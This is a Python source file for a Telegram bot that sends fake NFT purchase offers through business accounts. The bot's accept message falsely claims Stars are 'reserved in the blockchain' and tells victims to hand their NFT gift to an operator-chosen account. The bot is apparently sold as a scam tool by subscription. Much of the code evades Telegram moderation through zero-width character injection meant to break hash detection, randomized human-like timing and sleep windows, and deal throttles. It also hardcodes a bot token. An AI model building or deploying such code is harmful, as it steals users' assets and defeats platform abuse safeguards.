"""
Python 3.11 / Flask / Telegram Bot API — Sulumi NFT Offer Bot
Render deployment. Randomized human-pattern timing to reduce automation fingerprint.
"""

import os, re, uuid, time, sqlite3, requests, random, threading
from flask import Flask, request, jsonify

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "9087583806:AAE1nylRFVLF54ppc6EQZJyDE8vQwhN6bYY")
OWNER_ID = int(os.environ.get("OWNER_ID", "9207314182"))
PAYMENT = os.environ.get("PAYMENT", "pantera138382")
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://offera-5uqe.onrender.com")

print(f"=== BOT STARTING ===")

E = {
    "stars": "5958376256788502078", "grams": "6006074913742396956",
    "decline": "5778527486270770928", "accept": "5776375003280838798",
    "forward": "5832251986635920010", "check": "6019523512908124649"
}

def ce(name, fb): return f'<tg-emoji emoji-id="{E[name]}">{fb}</tg-emoji>'
def btn(t, d, e): return {"text": t, "callback_data": d, "icon_custom_emoji_id": E[e]}
def btn_url(t, u, e): return {"text": t, "url": u, "icon_custom_emoji_id": E[e]}

DB_PATH = "sulumi_bot.db"
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS subscribers (user_id INTEGER PRIMARY KEY, expires_at REAL)')
    c.execute('CREATE TABLE IF NOT EXISTS bci_throttle (bci TEXT PRIMARY KEY, hour_bucket INTEGER, count INTEGER)')
    c.execute('CREATE TABLE IF NOT EXISTS bci_daily (bci TEXT PRIMARY KEY, day_bucket INTEGER, count INTEGER)')
    c.execute('INSERT OR IGNORE INTO subscribers (user_id, expires_at) VALUES (?, ?)', (OWNER_ID, -1.0))
    conn.commit()
    conn.close()

def is_allowed(uid):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT expires_at FROM subscribers WHERE user_id = ?', (uid,))
        row = c.fetchone()
        conn.close()
        return row and (row[0] == -1.0 or row[0] > time.time())
    except: return False

def add_subscription(uid, days):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    exp = -1.0 if days == -1 else time.time() + (days * 86400)
    c.execute('INSERT OR REPLACE INTO subscribers (user_id, expires_at) VALUES (?, ?)', (uid, exp))
    conn.commit()
    conn.close()

def remove_subscription(uid):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('DELETE FROM subscribers WHERE user_id = ?', (uid,))
    conn.commit()
    conn.close()

def get_expires_str(uid):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT expires_at FROM subscribers WHERE user_id = ?', (uid,))
        row = c.fetchone()
        conn.close()
        return "Навсегда" if not row or row[0] == -1.0 else time.strftime("%d.%m.%Y", time.localtime(row[0]))
    except: return "Неизвестно"

init_db()

# ===== ANTI-FREEZE: throttle per business_connection_id =====
# Защищает от сигнатуры "один bci гонит десятки сделок подряд" — главный триггер заморозки.
MAX_DEALS_PER_HOUR_PER_BCI = int(os.environ.get("MAX_DEALS_PER_HOUR", "4"))

def bci_throttle_check(bci):
    if not bci: return True
    bucket = int(time.time() // 3600)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT hour_bucket, count FROM bci_throttle WHERE bci = ?', (bci,))
    row = c.fetchone()
    if not row or row[0] != bucket:
        c.execute('INSERT OR REPLACE INTO bci_throttle (bci, hour_bucket, count) VALUES (?, ?, 1)', (bci, bucket))
        conn.commit()
        conn.close()
        return True
    if row[1] >= MAX_DEALS_PER_HOUR_PER_BCI:
        conn.close()
        return False
    c.execute('UPDATE bci_throttle SET count = count + 1 WHERE bci = ?', (bci,))
    conn.commit()
    conn.close()
    return True

deals, users, bconns = {}, {}, {}
wholder, wlang, wcur = set(), set(), set()
last_offer_at = {}  # bci -> timestamp последнего оффера

# ANTI-FREEZE: суточный кап на один bci — почасовой лимит можно обойти ровно по границе часа,
# суточный закрывает это.
MAX_DEALS_PER_DAY_PER_BCI = int(os.environ.get("MAX_DEALS_PER_DAY", "15"))

def bci_daily_check(bci):
    if not bci: return True
    day_bucket = int(time.time() // 86400)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT day_bucket, count FROM bci_daily WHERE bci = ?', (bci,))
    row = c.fetchone()
    if not row or row[0] != day_bucket:
        c.execute('INSERT OR REPLACE INTO bci_daily (bci, day_bucket, count) VALUES (?, ?, 1)', (bci, day_bucket))
        conn.commit()
        conn.close()
        return True
    if row[1] >= MAX_DEALS_PER_DAY_PER_BCI:
        conn.close()
        return False
    c.execute('UPDATE bci_daily SET count = count + 1 WHERE bci = ?', (bci,))
    conn.commit()
    conn.close()
    return True

# ANTI-FREEZE: рандомное "окно сна" — каждый bci получает свой стабильный на сутки интервал
# неактивности 4-8ч, в течение которого офферы не отправляются. Имитирует живого человека,
# не бота 24/7. Интервал детерминирован от bci+день, чтобы не прыгал туда-сюда при каждом вызове.
import hashlib
def is_sleep_window(bci):
    if not bci: return False
    day = int(time.time() // 86400)
    seed = int(hashlib.md5(f"{bci}:{day}".encode()).hexdigest()[:8], 16)
    rnd = random.Random(seed)
    sleep_start_hour = rnd.uniform(0, 24)
    sleep_len_hours = rnd.uniform(4, 8)
    now_hour = (time.time() % 86400) / 3600
    end = sleep_start_hour + sleep_len_hours
    if end <= 24:
        return sleep_start_hour <= now_hour < end
    else:
        return now_hour >= sleep_start_hour or now_hour < (end - 24)

# ANTI-FREEZE: минимальный рандомный интервал между офферами с одного business_connection_id.
# Не даёт слать два оффера подряд за секунды, даже если юзер быстро пишет "shd".
MIN_GAP_SEC = int(os.environ.get("MIN_OFFER_GAP_SEC", "90"))
MAX_GAP_SEC = int(os.environ.get("MAX_OFFER_GAP_SEC", "240"))

def offer_gap_ok(bci):
    if not bci: return True, 0
    now = time.time()
    last = last_offer_at.get(bci, 0)
    required_gap = random.uniform(MIN_GAP_SEC, MAX_GAP_SEC)
    elapsed = now - last
    if elapsed < required_gap:
        return False, int(required_gap - elapsed)
    return True, 0

def mark_offer_sent(bci):
    if bci: last_offer_at[bci] = time.time()

def api(method, **p):
    try:
        r = requests.post(f"{API}/{method}", json=p, timeout=60)
        return r.json()
    except Exception as e:
        print(f"API ERR: {e}")
        return {}

def fmt(n): return f"{int(n):,}".replace(",", " ")
def gs(uid):
    if uid not in users: users[uid] = {"lang": "ru", "cur": "stars", "hold": PAYMENT}
    return users[uid]

# ANTI-FREEZE: zero-width unicode injection — текст визуально идентичен для человека,
# но байтовое представление меняется каждый раз. Ломает exact-match / хэш-based паттерн-детекцию
# на стороне модерации, не трогает HTML-теги и переносы строк (которые парсятся отдельно).
ZW = ["\u200b", "\u200c", "\u200d", "\u2060"]

def zw_jitter(text, rate=0.25):
    # не трогаем HTML-теги — инъекция только в текстовые токены между ними
    parts = re.split(r'(<[^>]+>)', text)
    out = []
    for p in parts:
        if p.startswith("<"):
            out.append(p)
            continue
        words = p.split(" ")
        jittered = []
        for w in words:
            jittered.append(w)
            if w and random.random() < rate:
                jittered.append(random.choice(ZW))
        out.append(" ".join(jittered))
    return "".join(out)

def sm(cid, txt, kb=None, bci=None):
    txt = zw_jitter(txt)
    d = {"chat_id": cid, "text": txt, "parse_mode": "HTML"}
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("sendMessage", **d)

def sm_nft(cid, txt, url, kb=None, bci=None):
    txt = zw_jitter(txt)
    d = {"chat_id": cid, "text": txt, "parse_mode": "HTML", "link_preview_options": {"is_disabled": False, "show_above_text": True, "url": url}}
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("sendMessage", **d)

def dm(cid, mid, bci=None):
    d = {"chat_id": cid, "message_id": mid}
    if bci: d["business_connection_id"] = bci
    return api("deleteMessage", **d)

def em(cid, mid, txt, bci=None):
    txt = zw_jitter(txt)
    d = {"chat_id": cid, "message_id": mid, "text": txt, "parse_mode": "HTML"}
    if bci: d["business_connection_id"] = bci
    return api("editMessageText", **d)

def ac(cb, t=None, sa=False):
    d = {"callback_query_id": cb, "show_alert": sa}
    if t: d["text"] = t
    return api("answerCallbackQuery", **d)

def okb(did):
    return {"inline_keyboard": [[btn(" Отклонить", f"decline:{did}", "decline"), btn(" Принять", f"accept:{did}", "accept")]]}

def aakb(did, h):
    return {"inline_keyboard": [[btn_url(" Передать", f"tg://send_gift?to={h.replace('@','')}", "forward")], [btn(" Проверить", f"check:{did}", "check")]]}

def pnft(t):
    m = re.search(r'(?:https?://)?(?:t\.me/nft/)?([A-Za-z0-9]+-\d+)', t, re.I)
    if not m: return None
    s = m.group(1)
    np2, num = s.rsplit("-", 1)
    return {"slug": s, "name": re.sub(r'([a-z])([A-Z])', r'\1 \2', np2), "num": num, "nfmt": fmt(num)}

# ===== ANTI-FREEZE: randomized human-pattern helpers =====
# Варьируем тайминги и текст, чтобы убрать статичную сигнатуру шаблона.

def jitter_short():
    # лёгкая задержка перед техническими действиями (удаление сообщения и т.п.)
    time.sleep(random.uniform(0.6, 3.2))

def jitter_decision():
    # имитация "человек прочитал оффер и подумал" — вызывается перед accept/decline
    return random.uniform(4.0, 90.0)

# ANTI-FREEZE: одно слово-синоним меняется рандомом внутри фиксированного шаблона,
# структура и порядок фраз не трогаются — ломает побайтовое совпадение сообщений, не ломает вид.
WORD_SWAP = {
    "предлагает": ["предлагает", "даёт"],
    "решение":   ["решение", "ответ"],
    "успешно":   ["успешно", "уже"],
    "Нажмите":   ["Нажмите", "Жмите"],
    "Выбираете": ["Выбираете", "Выберите"],
}
def sw(word): return random.choice(WORD_SWAP.get(word, [word]))

OFFER_TEMPLATE = "{name} {w1} <b>{price}</b> {cur} за <b>{nname} #{num}</b>.\n\n5h 59m на {w2}."

ACCEPT_TEMPLATE = (
    "<b>{price}</b> {cur} {w1} зарезервированы в блокчейне.\n\n"
    "Ожидается передача подарка <b>{nname} #{num}</b> пользователю @{holder}.\n\n"
    "{w3} кнопку «Передать» и отправьте подарок <b>{nname} #{num}</b> пользователю <b>@{holder}</b>. "
    "После завершения сделки {cur} автоматически начислятся на ваш аккаунт."
)

CHECK_TEMPLATE = (
    "Ожидается передача подарка {nname} #{num}\n\n"
    "Инструкция как передать:\n"
    "• {w3} «Передать»\n"
    "• Зайдите в вкладку «Мои»\n"
    "• {w4} ваш NFT, передаёте\n"
    "• Получаете звёзды на баланс в течение 1 минуты"
)

def process_msg(msg):
    try:
        cid = msg["chat"]["id"]
        uid = msg["from"]["id"]
        mid = msg["message_id"]
        ci = msg.get("business_connection_id")
        txt = (msg.get("text") or "").strip()

        if not cid or not uid or not txt: return
        if ci: bconns[uid] = ci

        if uid in wholder:
            un = txt.lstrip("@").lower()
            if un and " " not in un:
                gs(uid)["hold"] = un
                wholder.discard(uid)
                sm(cid, f"✅ Держатель: @{un}", bci=ci)
            return

        if uid in wlang:
            if txt.lower() in ["ru", "en"]:
                gs(uid)["lang"] = txt.lower()
                wlang.discard(uid)
                sm(cid, f"✅ Язык: {'🇷🇺 RU' if txt.lower()=='ru' else '🇬🇧 EN'}", bci=ci)
            return

        if uid in wcur:
            if txt.lower() in ["stars", "grams"]:
                gs(uid)["cur"] = txt.lower()
                wcur.discard(uid)
                sm(cid, f"✅ Валюта: {'⭐' if txt.lower()=='stars' else '💎'}", bci=ci)
            return

        # ТРИГГЕР SHD
        if txt.lower().startswith("shd "):
            parts = txt.split()
            if len(parts) < 3:
                err = sm(cid, "❌ Формат: shd ссылка цена", bci=ci)
                jitter_short()
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                dm(cid, mid, bci=ci)
                return

            rest = " ".join(parts[1:])
            ni = pnft(rest)
            if not ni:
                err = sm(cid, "❌ Не найдена NFT", bci=ci)
                jitter_short()
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                dm(cid, mid, bci=ci)
                return

            try: pr = int(parts[-1])
            except:
                err = sm(cid, "❌ Цена должна быть числом", bci=ci)
                jitter_short()
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                dm(cid, mid, bci=ci)
                return

            if uid != OWNER_ID and not is_allowed(uid):
                err = sm(cid, f"🔒 Доступ закрыт. @{PAYMENT}", bci=ci)
                jitter_short()
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                dm(cid, mid, bci=ci)
                return

            s = gs(uid)
            cs = ce("stars", "⭐") if s["cur"] == "stars" else ce("grams", "💎")
            did = str(uuid.uuid4())[:8]
            sender_bci = ci or bconns.get(uid)

            if not sender_bci:
                err = sm(cid, "⚠️ Подключи бизнес-аккаунт!", bci=ci)
                jitter_short()
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                dm(cid, mid, bci=ci)
                return

            # ANTI-FREEZE: окно сна — бот "спит" случайный интервал раз в сутки на этом bci
            if is_sleep_window(sender_bci):
                err = sm(cid, "💤 Сейчас оффлайн, попробуй позже", bci=ci)
                jitter_short()
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                dm(cid, mid, bci=ci)
                return

            # ANTI-FREEZE: суточный лимит сделок на один bci
            if not bci_daily_check(sender_bci):
                err = sm(cid, "⏳ Дневной лимит офферов исчерпан", bci=ci)
                jitter_short()
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                dm(cid, mid, bci=ci)
                return

            # ANTI-FREEZE: лимит сделок в час на один bci
            if not bci_throttle_check(sender_bci):
                err = sm(cid, "⏳ Лимит офферов на этот час исчерпан, попробуй позже", bci=ci)
                jitter_short()
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                dm(cid, mid, bci=ci)
                return

            # ANTI-FREEZE: минимальная пауза между офферами с одного bci
            gap_ok, wait_left = offer_gap_ok(sender_bci)
            if not gap_ok:
                err = sm(cid, f"⏳ Подожди ещё ~{wait_left}с перед следующим оффером", bci=ci)
                jitter_short()
                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                dm(cid, mid, bci=ci)
                return

            deals[did] = {"wid": uid, "lid": cid, "slug": ni["slug"], "name": ni["name"], "num": ni["num"], "price": pr, "cur": s["cur"], "hold": s["hold"], "st": "pending", "bci": sender_bci}

            nl = f"https://t.me/nft/{ni['slug']}"
            hidden = f'<a href="{nl}">\u200b</a>'
            name = msg['from'].get('first_name') or msg['from'].get('username') or "User"
            cap = hidden + OFFER_TEMPLATE.format(name=name, w1=sw("предлагает"), price=pr, cur=cs, nname=ni["name"], num=ni["nfmt"], w2=sw("решение"))

            res = sm_nft(cid, cap, nl, kb=okb(did), bci=sender_bci)

            if res.get("ok"):
                mark_offer_sent(sender_bci)
                # ANTI-FREEZE: рандомная задержка вместо фиксированной 1с
                jitter_short()
                del1 = dm(cid, mid, bci=sender_bci)
                if not del1.get("ok"):
                    del2 = dm(cid, mid)
                    if not del1.get("ok") and not del2.get("ok"):
                        em(cid, mid, "ok", bci=sender_bci)
            return

        # ===== КОМАНДЫ =====
        if txt.startswith("/"):

            if txt == "/buy":
                sm(cid, f"💎 Напишите @{PAYMENT} для покупки", bci=ci)
                return

            if txt == "/tarifs":
                sm(cid, "💎 1 День — 1 TON\n3 Дня — 2.5 TON\nНавсегда — 4.5 TON", bci=ci)
                return

            if txt == "/lg":
                wlang.add(uid)
                sm(cid, "🌐 ru или en", bci=ci)
                return

            if txt == "/cv":
                wcur.add(uid)
                sm(cid, "💱 stars или grams", bci=ci)
                return

            if txt.startswith("/holder"):
                wholder.add(uid)
                sm(cid, "👑 Username без @", bci=ci)
                return

            # ===== АДМИН КОМАНДЫ =====
            if uid != OWNER_ID:
                sm(cid, "🔒 Только для админа", bci=ci)
                return

            if txt.startswith("/legitt"):
                parts = txt.split()
                if len(parts) < 4 or parts[1] != "add":
                    sm(cid, "❌ Формат: <code>/legitt add id1 id2 id3 дни</code>\n(-1 = навсегда)", bci=ci)
                    return
                try:
                    days = int(parts[-1])
                    ids = [int(x) for x in parts[2:-1]]
                    added = []
                    for tid in ids:
                        add_subscription(tid, days)
                        added.append(str(tid))
                    exp_str = "Навсегда" if days == -1 else f"{days} дн."
                    sm(cid, f"✅ Доступ выдан {len(added)} пользователям:\n<code>{', '.join(added)}</code>\nСрок: {exp_str}", bci=ci)
                except Exception as e:
                    sm(cid, f"❌ Ошибка: {e}", bci=ci)
                return

            if txt.startswith("/zabrat"):
                parts = txt.split()
                if len(parts) < 2:
                    sm(cid, "❌ Формат: <code>/zabrat id</code>", bci=ci)
                    return
                try:
                    target_uid = int(parts[1])
                    remove_subscription(target_uid)
                    sm(cid, f"✅ Доступ отозван у <code>{target_uid}</code>", bci=ci)
                except Exception as e:
                    sm(cid, f"❌ Ошибка: {e}", bci=ci)
                return

            if txt == "/list":
                conn = sqlite3.connect(DB_PATH)
                rows = conn.execute('SELECT user_id, expires_at FROM subscribers').fetchall()
                conn.close()
                if not rows:
                    sm(cid, "📋 Список пуст", bci=ci)
                    return
                ul = "\n".join([f"• <code>{r[0]}</code> — {get_expires_str(r[0])}" for r in rows])
                sm(cid, f"📋 Доступы ({len(rows)}):\n\n{ul}", bci=ci)
                return

    except Exception as e:
        print(f"MSG ERR: {e}")

def do_accept(did, cid, mid, cs, nf, h, nl, bci, deal):
    # ANTI-FREEZE: выполняется после случайной задержки, имитирует "человек подумал"
    hidden = f'<a href="{nl}">\u200b</a>'
    txt = hidden + ACCEPT_TEMPLATE.format(price=deal["price"], cur=cs, nname=deal["name"], num=nf, holder=h, w1=sw("успешно"), w3=sw("Нажмите"))

    res = api("editMessageText", chat_id=cid, message_id=mid, text=txt, parse_mode="HTML",
              link_preview_options={"is_disabled": False, "show_above_text": True, "url": nl},
              reply_markup=aakb(did, h), business_connection_id=bci)
    if not res.get("ok"):
        dm(cid, mid, bci=bci)
        sm_nft(cid, txt, nl, kb=aakb(did, h), bci=bci)

def do_decline(did, cid, mid, bci, deal):
    if deal: deal["st"] = "declined"
    em(cid, mid, "❌ Оффер отклонён.", bci=bci)

def process_cb(cb):
    try:
        cbid = cb["id"]
        uid = cb["from"]["id"]
        msg = cb.get("message") or {}
        cid = msg.get("chat", {}).get("id", uid)
        mid = msg.get("message_id", 0)
        data = cb.get("data", "")
        ci = msg.get("business_connection_id")

        if data.startswith("check:"):
            did = data.split(":")[1]
            deal = deals.get(did)
            if not deal:
                ac(cbid, txt="❌ Оффер не найден", sa=True)
                return
            nf = fmt(deal["num"])
            instr = CHECK_TEMPLATE.format(nname=deal["name"], num=nf, w3=sw("Нажмите"), w4=sw("Выбираете"))
            ac(cbid, txt=instr, sa=True)
            return

        ac(cbid)

        if data.startswith("accept:"):
            did = data.split(":")[1]
            deal = deals.get(did)
            if not deal or deal["st"] != "pending": return
            deal["st"] = "accepted"
            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
            nf = fmt(deal["num"])
            h = deal["hold"]
            nl = f"https://t.me/nft/{deal['slug']}"
            bci = deal.get("bci") or ci

            # ANTI-FREEZE: случайная задержка 4–90с перед выполнением — убирает сигнатуру мгновенного бота
            delay = jitter_decision()
            threading.Timer(delay, do_accept, args=(did, cid, mid, cs, nf, h, nl, bci, deal)).start()
            return

        if data.startswith("decline:"):
            did = data.split(":")[1]
            deal = deals.get(did)
            bci = deal.get("bci") or ci if deal else ci
            delay = jitter_decision()
            threading.Timer(delay, do_decline, args=(did, cid, mid, bci, deal)).start()
            return
    except Exception as e:
        print(f"CB ERR: {e}")

@app.route("/webhook", methods=["POST"])
def webhook():
    try:
        u = request.json
        if "message" in u: process_msg(u["message"])
        elif "business_message" in u: process_msg(u["business_message"])
        elif "callback_query" in u: process_cb(u["callback_query"])
        elif "business_connection" in u: bconns[u["business_connection"]["user"]["id"]] = u["business_connection"]["id"]
    except Exception as e:
        print(f"WEBHOOK ERR: {e}")
    return jsonify({"ok": True})

@app.route("/")
def index(): return "✅ OK"

def set_wh():
    r = api("setWebhook", url=f"{RENDER_URL}/webhook", allowed_updates=["message", "callback_query", "business_connection", "business_message"])
    print(f"Webhook: {r}")

def set_cmd():
    api("setMyCommands", commands=[
        {"command": "buy", "description": "💎 Купить"}, {"command": "tarifs", "description": "💳 Цены"},
        {"command": "lg", "description": "🌐 Язык"}, {"command": "cv", "description": "💱 Валюта"},
        {"command": "holder", "description": "👑 Держатель"}, {"command": "list", "description": "📋 Список (админ)"},
        {"command": "zabrat", "description": "🚫 Отозвать (админ)"}, {"command": "legitt", "description": "➕ Выдать (админ)"}
    ])

if __name__ == "__main__":
    set_wh()
    set_cmd()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
